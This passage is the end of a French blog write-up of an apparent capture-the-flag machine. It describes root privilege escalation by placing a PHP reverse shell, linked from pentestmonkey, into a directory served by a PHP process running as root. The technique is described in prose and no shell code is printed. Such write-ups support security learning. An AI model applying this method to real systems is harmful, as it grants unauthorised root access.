</span></span></span></code></pre><p>On voit que le dossier <code>/opt/website-monitor</code> est utilisé comme repertoire source pour un serveur PHP, et que ce processus tourne en tant que root.<p>Il nous suffit donc de placer un fichier <code>.php</code> nous permettant d’obtenir un reverse shell (par exemple celui de <a href=https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php>pentestmonkey</a>) dans le dossier <code>/opt/website-monitor/config</code>, et nous aurons accès en tant que root à la machine.</p><img class=no-hover src=root_flag.jpg><span class=hidden id=copy-code-text>Copy Code</span><span class=hidden id=search-index>https://nathandecou.github.io/blog/search_index.en.json</span><span class=hidden id=more-matches-text>$MATCHES more matches</span></main><footer id=site-footer><nav><ul><li><a href=https://nathandecou.github.io/blog/osint/>OSINT</a><li><a href=https://nathandecou.github.io/blog/cyber/>Cybersecurite</a><li><a href=https://nathandecou.github.io/blog/dev/>Dev</a></ul></nav><p>© Chez M. Dec, 2025<p><small>Powered by <a class="link external" href=https://www.getzola.org>Zola</a> and <a class="link external" href=https://duckquill.daudix.one>Duckquill</a> </small></footer>